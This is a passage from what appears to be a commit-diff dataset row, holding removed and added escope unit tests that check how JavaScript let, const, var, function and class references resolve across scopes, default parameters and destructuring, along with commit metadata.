expect(reference.resolved).to.be.null<\n>-            expect(reference.writeExpr).to.be.undefined<\n>-            expect(reference.isWrite()).to.be.false<\n>-            expect(reference.isRead()).to.be.true<\n>-        it 'the reference in default parameters should NOT be resolved.'<c> -><\n>-            ast = harmony.parse """"""<\n>-            function a() {}<\n>-            function foo(b = a()) {<\n>-            }<\n>-            """"""<\n>-            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-            expect(scopeManager.scopes).to.have.length 3  # [global<c> a<c> foo]<\n>-            scope = scopeManager.scopes[2]<\n>-            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>-            expect(scope.references).to.have.length 2  # [b<c> a]<\n>-            reference = scope.references[1]<\n>-            expect(reference.from).to.equal scope<\n>-            expect(reference.identifier.name).to.equal 'a'<\n>-            expect(reference.resolved).to.be.null<\n>-            expect(reference.writeExpr).to.be.undefined<\n>-            expect(reference.isWrite()).to.be.false<\n>-            expect(reference.isRead()).to.be.true<\n>-        it 'the reference in default values of destructuring should NOT be resolved.'<c> -><\n>-            ast = harmony.parse """"""<\n>-            function a() {}<\n>-            function foo() {<\n>-                let {b: a()} = {};<\n>-            }<\n>-            """"""<\n>-            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-            expect(scopeManager.scopes).to.have.length 3  # [global<c> a<c> foo]<\n>-            scope = scopeManager.scopes[2]<\n>-            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>-            expect(scope.references).to.have.length 2  # [b<c> a]<\n>-            reference = scope.references[1]<\n>-            expect(reference.from).to.equal scope<\n>-            expect(reference.identifier.name).to.equal 'a'<\n>-            expect(reference.resolved).to.be.null<\n>-            expect(reference.writeExpr).to.be.undefined<\n>-            expect(reference.isWrite()).to.be.false<\n>-            expect(reference.isRead()).to.be.true<\n>-        it 'the reference in default parameters should be resolved.'<c> -><\n>-            ast = harmony.parse """"""<\n>-            class A {}<\n>-            function foo(b = new A()) {<\n>-            }<\n>-            """"""<\n>-            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-            expect(scopeManager.scopes).to.have.length 3  # [global<c> A<c> foo]<\n>-            scope = scopeManager.scopes[2]<\n>-            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>-            expect(scope.references).to.have.length 2  # [b<c> A]<\n>-            reference = scope.references[1]<\n>-            expect(reference.from).to.equal scope<\n>-            expect(reference.identifier.name).to.equal 'A'<\n>-            expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>-            expect(reference.writeExpr).to.be.undefined<\n>-            expect(reference.isWrite()).to.be.false<\n>-            expect(reference.isRead()).to.be.true<\n>-        it 'the reference in default values of destructuring should be resolved.'<c> -><\n>-            ast = harmony.parse """"""<\n>-            class A {}<\n>-            function foo() {<\n>-                let {b: new A()} = {};<\n>-            }<\n>-            """"""<\n>-            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-            expect(scopeManager.scopes).to.have.length 3  # [global<c> A<c> foo]<\n>-            scope = scopeManager.scopes[2]<\n>-            expect(scope.variables).to.have.length 2  # [arguments<c> A]<\n>-            expect(scope.references).to.have.length 2  # [b<c> a]<\n>-            reference = scope.references[1]<\n>-            expect(reference.from).to.equal scope<\n>-            expect(reference.identifier.name).to.equal 'A'<\n>-            expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>-            expect(reference.writeExpr).to.be.undefined<\n>-            expect(reference.isWrite()).to.be.false<\n>-            expect(reference.isRead()).to.be.true<\n>-        it 'the reference in default parameters body should be resolved.'<c> -><\n>-                let a = 0;<\n>-                function bar(b = a) {<\n>-                }<\n>-            expect(scopeManager.scopes).to.have.length 3  # [global<c> foo<c> bar]<\n>-            scope = scopeManager.scopes[2]<\n>-            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>-            expect(scope.references).to.have.length 2  # [b<c> a]<\n>-            reference = scope.references[1]<\n>-            expect(reference.resolved).to.equal scopeManager.scopes[1].variables[1]<\n>-            expect(reference.writeExpr).to.be.undefined<\n>-            expect(reference.isWrite()).to.be.false<\n>-            expect(reference.isRead()).to.be.true<\n>-        it 'the reference in default values of destructuring should be resolved.'<c> -><\n>-                let a = 0;<\n>-                    let {b: a} = {};<\n>",F
17,56,56,569,4,26,Toru Nagashima,103,3,460,33,User,0,2574,Fri,22,2,8 May 2015,Fix for multiple declarations and add tests.,0,0,2,672,33362,"+function shouldBeStatically(def) {<\n>+    return (<\n>+        (def.type === Variable.ClassName) ||<\n>+        (def.type === Variable.Variable && def.parent.kind !== ""var"")<\n>+    );<\n>+        var defs = variable.defs;<\n>+        return defs.length > 0 && defs.every(shouldBeStatically);<\n>+        } else {<\n>+    describe 'When there is a `let` declaration on global<c>'<c> -><\n>+        it 'the reference on global should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 1<\n>+            scope = scopeManager.scopes[0]<\n>+            expect(scope.variables).to.have.length 1<\n>+            expect(scope.references).to.have.length 1<\n>+            reference = scope.references[0]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.equal scope.variables[0]<\n>+            expect(reference.writeExpr).to.not.be.undefined<\n>+            expect(reference.isWrite()).to.be.true<\n>+            expect(reference.isRead()).to.be.false<\n>+        it 'the reference in functions should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            let a = 0;<\n>+            function foo() {<\n>+                let b = a;<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+            scope = scopeManager.scopes[1]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> a]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+        it 'the reference in default parameters should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            let a = 0;<\n>+            function foo(b = a) {<\n>+            }<\n>+            """"""<\n>+            console.log(JSON.stringify(ast<c> null<c> 2))<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+            scope = scopeManager.scopes[1]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> a]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+        it 'the reference in default values of destructuring should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            let a = 0;<\n>+            function foo() {<\n>+                let {b: a} = {};<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+            scope = scopeManager.scopes[1]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> a]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+    describe 'When there is a `const` declaration on global<c>'<c> -><\n>+        it 'the reference on global should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            const a = 0;<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 1<\n>+            scope = scopeManager.scopes[0]<\n>+            expect(scope.variables).to.have.length 1<\n>+            expect(scope.references).to.have.length 1<\n>+            reference = scope.references[0]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.equal scope.variables[0]<\n>+            expect(reference.writeExpr).to.not.be.undefined<\n>+            expect(reference.isWrite()).to.be.true<\n>+            expect(reference.isRead()).to.be.false<\n>+        it 'the reference in functions should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            const a = 0;<\n>+            function foo() {<\n>+                const b = a;<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+            scope = scopeManager.scopes[1]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> a]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+        it 'the reference in default parameters should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            function foo(b = a) {<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+            scope = scopeManager.scopes[1]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> a]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+        it 'the reference in default values of destructuring should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            const a = 0;<\n>+            function foo() {<\n>+                const {b: a} = {};<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+            scope = scopeManager.scopes[1]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> a]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+    describe 'When there is a `var` declaration on global<c>'<c> -><\n>+        it 'the reference on global should NOT be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 1<\n>+            scope = scopeManager.scopes[0]<\n>+            expect(scope.variables).to.have.length 1<\n>+            expect(scope.references).to.have.length 1<\n>+            reference = scope.references[0]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.be.null<\n>+            expect(reference.writeExpr).to.not.be.undefined<\n>+            expect(reference.isWrite()).to.be.true<\n>+            expect(reference.isRead()).to.be.false<\n>+        it 'the reference in functions should NOT be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            var a = 0;<\n>+            function foo() {<\n>+                var b = a;<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+            scope = scopeManager.scopes[1]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> a]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.be.null<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+        it 'the reference in default parameters should NOT be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            var a = 0;<\n>+            function foo(b = a) {<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+            scope = scopeManager.scopes[1]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> a]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.be.null<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+        it 'the reference in default values of destructuring should NOT be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            var a = 0;<\n>+            function foo() {<\n>+                var {b: a} = {};<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+            scope = scopeManager.scopes[1]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> a]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.be.null<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+    describe 'When there is a `function` declaration on global<c>'<c> -><\n>+        it 'the reference on global should NOT be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 2  # [global<c> a]<\n>+            scope = scopeManager.scopes[0]<\n>+            expect(scope.variables).to.have.length 1<\n>+            expect(scope.references).to.have.length 1<\n>+            reference = scope.references[0]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.be.null<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+        it 'the reference in functions should NOT be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            function a() {}<\n>+            function foo() {<\n>+                let b = a();<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 3  # [global<c> a<c> foo]<\n>+            scope = scopeManager.scopes[2]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> a]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.be.null<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+        it 'the reference in default parameters should NOT be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            function a() {}<\n>+            function foo(b = a()) {<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 3  # [global<c> a<c> foo]<\n>+            scope = scopeManager.scopes[2]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> a]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.be.null<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+        it 'the reference in default values of destructuring should NOT be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            function a() {}<\n>+            function foo() {<\n>+                let {b: a()} = {};<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 3  # [global<c> a<c> foo]<\n>+            scope = scopeManager.scopes[2]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> a]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.be.null<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+    describe 'When there is a `class` declaration on global<c>'<c> -><\n>+        it 'the reference on global should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            class A {}<\n>+            let b = new A();<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 2  # [global<c> A]<\n>+            scope = scopeManager.scopes[0]<\n>+            expect(scope.variables).to.have.length 2  # [A<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> A]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'A'<\n>+            expect(reference.resolved).to.equal scope.variables[0]<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+        it 'the reference in functions should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            class A {}<\n>+            function foo() {<\n>+                let b = new A();<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 3  # [global<c> A<c> foo]<\n>+            scope = scopeManager.scopes[2]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> A]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'A'<\n>+            expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+        it 'the reference in default parameters should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            class A {}<\n>+            function foo(b = new A()) {<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 3  # [global<c> A<c> foo]<\n>+            scope = scopeManager.scopes[2]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> A]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'A'<\n>+            expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+        it 'the reference in default values of destructuring should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            function foo() {<\n>+                let {b: new A()} = {};<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 3  # [global<c> A<c> foo]<\n>+            scope = scopeManager.scopes[2]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> A]<\n>+            expect(scope.references).to.have.length 2  # [b<c> a]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'A'<\n>+            expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+    describe 'When there is a `let` declaration in functions<c>'<c> -><\n>+        it 'the reference on the function should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            function foo() {<\n>+                let a = 0;<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+            scope = scopeManager.scopes[1]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> a]<\n>+            expect(scope.references).to.have.length 1<\n>+            reference = scope.references[0]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.equal scope.variables[1]<\n>+            expect(reference.writeExpr).to.not.be.undefined<\n>+            expect(reference.isWrite()).to.be.true<\n>+            expect(reference.isRead()).to.be.false<\n>+        it 'the reference in nested functions should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            function foo() {<\n>+                let a = 0;<\n>+                function bar() {<\n>+                    let b = a;<\n>+                }<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 3  # [global<c> foo<c> bar]<\n>+            scope = scopeManager.scopes[2]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> a]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.equal scopeManager.scopes[1].variables[1]<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+        it 'the reference in default parameters body should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            function foo() {<\n>+                let a = 0;<\n>+                function bar(b = a) {<\n>+                }<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 3  # [global<c> foo<c> bar]<\n>+            scope = scopeManager.scopes[2]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> a]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.equal scopeManager.scopes[1].variables[1]<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+        it 'the reference in default values of destructuring should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            function foo() {<\n>+                let a = 0;<\n>+                function bar() {<\n>+                    let {b: a} = {};<\n>+                }<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 3  # [global<c> foo<c> bar]<\n>+            scope = scopeManager.scopes[2]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> a]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.equal scopeManager.scopes[1].variables[1]<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+    describe 'When there is a `let` declaration with destructuring assignment'<c> -><\n>+        it '""let [a] = [1];""<c> the reference should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            let [a] = [1];<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 1<\n>+            scope = scopeManager.scopes[0]<\n>+            expect(scope.variables).to.have.length 1<\n>+            expect(scope.references).to.have.length 1<\n>+            reference = scope.references[0]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.equal scope.variables[0]<\n>+            expect(reference.writeExpr).to.not.be.undefined<\n>+            expect(reference.isWrite()).to.be.true<\n>+            expect(reference.isRead()).to.be.false<\n>+        it '""let {a} = {a: 1};""<c> the reference should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            let {a} = {a: 1};<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 1<\n>+            scope = scopeManager.scopes[0]<\n>+            expect(scope.variables).to.have.length 1<\n>+            expect(scope.references).to.have.length 1<\n>+            reference = scope.references[0]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.equal scope.variables[0]<\n>+            expect(reference.writeExpr).to.not.be.undefined<\n>+            expect(reference.isWrite()).to.be.true<\n>+            expect(reference.isRead()).to.be.false<\n>+        it '""let {a: {a}} = {a: {a: 1}};""<c> the reference should be resolved.'<c> -><\n>+            ast = harmony.parse """"""<\n>+            let {a: {a}} = {a: {a: 1}};<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 1<\n>+            scope = scopeManager.scopes[0]<\n>+            expect(scope.variables).to.have.length 1<\n>+            expect(scope.references).to.have.length 1<\n>+            reference = scope.references[0]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.equal scope.variables[0]<\n>+            expect(reference.writeExpr).to.not.be.undefined<\n>+            expect(reference.isWrite()).to.be.true<\n>+            expect(reference.isRead()).to.be.false<\n>","-        //TODO: Confirm the mean of array<c> and rewrite.<\n>-        var def = variable.defs[0];<\n>-        return def != null && (<\n>-            (def.type === Variable.ClassName) ||<\n>-            (def.type === Variable.Variable && def.parent.kind !== ""var"")<\n>-        );<\n>-        }<\n>-        else {<\n>-    it '""let a = 0;"" should have a writable reference on global.'<c> -><\n>-        ast = harmony.parse """"""<\n>-        let a = 0;<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 1<\n>-        scope = scopeManager.scopes[0]<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.references).to.have.length 1<\n>-        reference = scope.references[0]<\n>-        expect(reference.from).to.equal scope<\n>-        expect(reference.identifier.name).to.equal 'a'<\n>-        expect(reference.resolved).to.equal scope.variables[0]<\n>-        expect(reference.writeExpr).to.not.be.undefined<\n>-        expect(reference.isWrite()).to.be.true<\n>-        expect(reference.isRead()).to.be.false<\n>-    it '""let a = 0;"" should have a writable reference in function.'<c> -><\n>-        ast = harmony.parse """"""<\n>-        function foo() {<\n>-        }<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.variables).to.have.length 2  # [arguments<c> a]<\n>-        expect(scope.references).to.have.length 1<\n>-        reference = scope.references[0]<\n>-        expect(reference.from).to.equal scope<\n>-        expect(reference.identifier.name).to.equal 'a'<\n>-        expect(reference.resolved).to.equal scope.variables[1]<\n>-        expect(reference.writeExpr).to.not.be.undefined<\n>-        expect(reference.isWrite()).to.be.true<\n>-        expect(reference.isRead()).to.be.false<\n>-    it '""const a = 0;"" should have a writable reference on global.'<c> -><\n>-        ast = harmony.parse """"""<\n>-        const a = 0;<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 1<\n>-        scope = scopeManager.scopes[0]<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.references).to.have.length 1<\n>-        reference = scope.references[0]<\n>-        expect(reference.from).to.equal scope<\n>-        expect(reference.identifier.name).to.equal 'a'<\n>-        expect(reference.resolved).to.equal scope.variables[0]<\n>-        expect(reference.writeExpr).to.not.be.undefined<\n>-        expect(reference.isWrite()).to.be.true<\n>-        expect(reference.isRead()).to.be.false<\n>-    it '""const a = 0;"" should have a writable reference in function.'<c> -><\n>-        ast = harmony.parse """"""<\n>-        function foo() {<\n>-        }<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.variables).to.have.length 2  # [arguments<c> a]<\n>-        expect(scope.references).to.have.length 1<\n>-        reference = scope.references[0]<\n>-        expect(reference.from).to.equal scope<\n>-        expect(reference.identifier.name).to.equal 'a'<\n>-        expect(reference.resolved).to.equal scope.variables[1]<\n>-        expect(reference.writeExpr).to.not.be.undefined<\n>-        expect(reference.isWrite()).to.be.true<\n>-        expect(reference.isRead()).to.be.false<\n>-    it '""var a = 0;"" should not have references on global.'<c> -><\n>-        ast = harmony.parse 